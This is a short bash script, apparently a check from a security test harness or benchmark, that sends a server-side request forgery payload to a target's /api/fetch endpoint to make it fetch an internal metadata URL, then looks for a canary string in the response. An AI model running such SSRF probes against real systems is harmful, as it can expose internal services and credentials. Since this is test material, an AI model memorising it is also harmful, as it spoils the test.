#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
out=$(curl -sG "$TARGET/api/fetch" --data-urlencode 'url=http://internal-sink:8025/metadata')
echo "$out" | grep -q 'INTERNAL-RAILS-SSRF-METADATA-4d9c'
